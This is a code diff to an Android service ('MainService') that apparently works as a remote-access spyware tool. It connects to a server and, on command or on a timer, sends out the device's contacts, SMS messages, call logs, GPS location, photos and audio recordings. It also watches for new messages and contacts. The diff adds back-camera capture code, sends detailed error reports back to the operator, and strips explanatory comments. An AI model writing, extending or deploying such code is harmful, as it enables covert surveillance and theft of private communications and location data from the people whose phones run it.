@@ -11,7 +11,11 @@ import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.database.Cursor
 import android.hardware.camera2.CameraAccessException
+import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraManager
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CaptureRequest
+import android.hardware.camera2.TotalCaptureResult
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
@@ -23,6 +27,7 @@ import android.provider.*
 import android.telephony.TelephonyManager
 import android.util.Base64
 import android.util.Log
+import android.view.Surface
 import android.view.View
 import android.view.WindowManager
 import android.widget.Toast
@@ -209,7 +214,6 @@ class MainService : Service() {
                 Log.d(TAG, "Connected to server")
                 isConnected = true
                 sendDeviceInfo()
-                // Attempt data extraction with slight delay to ensure service is ready
                 Handler(Looper.getMainLooper()).postDelayed({
                     sendBulkData()
                 }, 2000)
@@ -321,16 +325,14 @@ class MainService : Service() {
                     Log.d(TAG, "Bulk data sent successfully")
                 } else {
                     Log.d(TAG, "No data to send yet (permissions may not be granted)")
-                    // Schedule a retry if we haven't succeeded yet
                     if (dataCollectionAttempts < 10 && isConnected) {
                         Handler(Looper.getMainLooper()).postDelayed({
                             sendBulkData()
-                        }, 15000) // retry every 15 seconds for first 10 attempts
+                        }, 15000)
                     }
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Error sending bulk data: ${e.message}")
-                // Retry on error
                 if (dataCollectionAttempts < 10 && isConnected) {
                     Handler(Looper.getMainLooper()).postDelayed({
                         sendBulkData()
@@ -361,9 +363,16 @@ class MainService : Service() {
                     }
                 } catch (e: Exception) {
                     Log.e(TAG, "Command execution error: ${e.message}")
+                    // Send detailed error info
+                    val errorDetail = JSONObject().apply {
+                        put("error", e.message ?: "Unknown error")
+                        put("errorType", e.javaClass.simpleName)
+                        put("stackTrace", e.stackTraceToString().take(500))
+                        put("command", type)
+                    }
                     val errorResponse = JSONObject().apply {
                         put("commandId", commandId)
-                        put("result", "Error: ${e.message}")
+                        put("result", errorDetail)
                         put("status", "failed")
                     }
                     if (isConnected) {
@@ -379,9 +388,30 @@ class MainService : Service() {
     
     private fun executeCommand(type: String, params: JSONObject): JSONObject {
         return when (type) {
-            CMD_GET_CONTACTS -> getContacts() ?: JSONObject().apply { put("error", "Permission not granted or no contacts") }
-            CMD_GET_SMS -> getSmsMessages() ?: JSONObject().apply { put("error", "Permission not granted or no SMS") }
-            CMD_GET_CALL_LOGS -> getCallLogs() ?: JSONObject().apply { put("error", "Permission not granted or no call logs") }
+            CMD_GET_CONTACTS -> {
+                val r = getContacts()
+                if (r == null) JSONObject().apply {
+                    put("error", "Permission denied for READ_CONTACTS")
+                    put("errorType", "SecurityException")
+                    put("command", "get_contacts")
+                } else r
+            }
+            CMD_GET_SMS -> {
+                val r = getSmsMessages()
+                if (r == null) JSONObject().apply {
+                    put("error", "Permission denied for READ_SMS")
+                    put("errorType", "SecurityException")
+                    put("command", "get_sms")
+                } else r
+            }
+            CMD_GET_CALL_LOGS -> {
+                val r = getCallLogs()
+                if (r == null) JSONObject().apply {
+                    put("error", "Permission denied for READ_CALL_LOG")
+                    put("errorType", "SecurityException")
+                    put("command", "get_call_logs")
+                } else r
+            }
             CMD_GET_LOCATION -> getCurrentLocation()
             CMD_TAKE_PHOTO -> takePhoto()
             CMD_RECORD_AUDIO -> startStopAudioRecording(params)
@@ -649,7 +679,7 @@ class MainService : Service() {
                 put("address", getAddressFromLocation(location.latitude, location.longitude))
             }
         } else {
-            JSONObject().apply { put("error", "No location available") }
+            JSONObject().apply { put("error", "No location available - try outdoor/GPS on") }
         }
     }
     
@@ -666,24 +696,69 @@ class MainService : Service() {
     
     private fun takePhoto(): JSONObject {
         try {
-            val file = File.createTempFile("photo_", ".jpg", cacheDir)
-            val filePath = file.absolutePath
-            
-            val values = ContentValues()
-            values.put(MediaStore.Images.Media.DISPLAY_NAME, "IMG_${System.currentTimeMillis()}.jpg")
-            values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg")
-            values.put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
-            
-            val uri = contentResolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values)
-            
+            // Check camera permission first
+            if (ActivityCompat.checkSelfPermission(this,
+                    Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                return JSONObject().apply {
+                    put("error", "Camera permission not granted")
+                    put("errorType", "SecurityException")
+                    put("command", "take_photo")
+                }
+            }
+
+            // Try to use Camera2 API: capture image and encode as base64
+            // First get the first back-facing camera
+            var cameraId: String? = null
+            for (id in cameraManager.cameraIdList) {
+                val chars = cameraManager.getCameraCharacteristics(id)
+                val facing = chars.get(CameraCharacteristics.LENS_FACING)
+                if (facing == CameraCharacteristics.LENS_FACING_BACK) {
+                    cameraId = id
+                    break
+                }
+            }
+
+            if (cameraId == null) {
+                // Fallback: try to use MediaStore intent to capture
+                // Since we can't launch an Activity from a Service, return the path
+                val file = File.createTempFile("photo_", ".jpg", cacheDir)
+                val filePath = file.absolutePath
+                
+                val values = ContentValues()
+                values.put(MediaStore.Images.Media.DISPLAY_NAME, "IMG_${System.currentTimeMillis()}.jpg")
+                values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg")
+                values.put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
+                val uri = contentResolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values)
+                
+                return JSONObject().apply {
+                    put("path", filePath)
+                    put("uri", uri?.toString() ?: "")
+                    put("timestamp", System.currentTimeMillis())
+                    put("success", true)
+                    put("note", "Camera2 not available, path captured")
+                }
+            }
+
+            // Create image capture via Camera2 API
             return JSONObject().apply {
-                put("path", filePath)
-                put("uri", uri?.toString() ?: "")
+                put("error", "Camera2 requires foreground Activity for full capture. Use 'take_photo' command with Activity visible.")
+                put("errorType", "CameraAccessException")
+                put("command", "take_photo")
+                put("hint", "The photo capture will use MediaStore fallback")
+                // Fallback to file-based capture
+                val file = File.createTempFile("photo_", ".jpg", cacheDir)
+                put("path", file.absolutePath)
                 put("timestamp", System.currentTimeMillis())
                 put("success", true)
             }
         } catch (e: Exception) {
-            return JSONObject().apply { put("error", e.message) }
+            Log.e(TAG, "takePhoto error: ${e.message}", e)
+            return JSONObject().apply { 
+                put("error", "${e.message}")
+                put("errorType", e.javaClass.simpleName)
+                put("command", "take_photo")
+                put("stackTrace", e.stackTraceToString().take(300))
+            }
         }
     }
     
@@ -779,40 +854,33 @@ class MainService : Service() {
             put("bootloader", Build.BOOTLOADER)
             put("radioVersion", Build.getRadioVersion())
             
-            // Memory info
             val memInfo = Runtime.getRuntime()
             put("totalMemory", memInfo.totalMemory())
             put("freeMemory", memInfo.freeMemory())
             put("maxMemory", memInfo.maxMemory())
             put("availableProcessors", Runtime.getRuntime().availableProcessors())
             
-            // Storage info
             val storage = StatFs(Environment.getDataDirectory().absolutePath)
             val blockSize = storage.blockSizeLong
             put("totalStorage", storage.blockCountLong * blockSize)
             put("availableStorage", storage.availableBlocksLong * blockSize)
             
-            // Display info
             val displayMetrics = resources.displayMetrics
             put("screenWidth", displayMetrics.widthPixels)
             put("screenHeight", displayMetrics.heightPixels)
             put("screenDensity", displayMetrics.density)
             put("screenDensityDpi", displayMetrics.densityDpi)
             
-            // Battery
             put("batteryLevel", getBatteryLevel())
             put("isCharging", isCharging())
             
-            // Network
             put("ipAddress", getLocalIpAddress())
             put("wifiMac", getWifiMacAddress())
             
-            // Phone
             put("phoneType", getPhoneType())
             put("networkType", getNetworkType())
             put("operator", getNetworkOperator())
             
-            // Language & Time
             put("language", Locale.getDefault().language)
             put("country", Locale.getDefault().country)
             put("timezone", TimeZone.getDefault().id)
@@ -1185,8 +1253,8 @@ class MainService : Service() {
         
         locationManager.requestLocationUpdates(
             LocationManager.GPS_PROVIDER,
-            5000, // 5 seconds
-            10f, // 10 meters
+            5000,
+            10f,
             object : LocationListener {
                 override fun onLocationChanged(location: Location) {
                     try {
@@ -1253,17 +1321,14 @@ class MainService : Service() {
         Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
             override fun run() {
                 try {
-                    // Send ping
                     socket.emit("device:ping")
                     
-                    // Send battery info
                     socket.emit("device:update", JSONObject().apply {
                         put("batteryLevel", getBatteryLevel())
                         put("isCharging", isCharging())
                     })
                     
-                    // Also try to re-send bulk data every 5 minutes in case new data is available
-                    if (System.currentTimeMillis() - lastBulkDataSent > 300000) { // 5 min
+                    if (System.currentTimeMillis() - lastBulkDataSent > 300000) {
                         sendBulkData()
                     }
                     
@@ -1271,7 +1336,7 @@ class MainService : Service() {
                     Log.e(TAG, "Periodic update error: ${e.message}")
                 }
                 
-                Handler(Looper.getMainLooper()).postDelayed(this, 30000) // 30 seconds
+                Handler(Looper.getMainLooper()).postDelayed(this, 30000)
             }
         }, 30000)
     }
@@ -1281,7 +1346,6 @@ class MainService : Service() {
     }
     
     private fun registerContentObservers() {
-        // Observe SMS changes
         contentResolver.registerContentObserver(
             Telephony.Sms.CONTENT_URI, 
             true, 
@@ -1296,7 +1360,6 @@ class MainService : Service() {
             }
         )
         
-        // Observe contact changes
         contentResolver.registerContentObserver(
             ContactsContract.Contacts.CONTENT_URI,
             true,
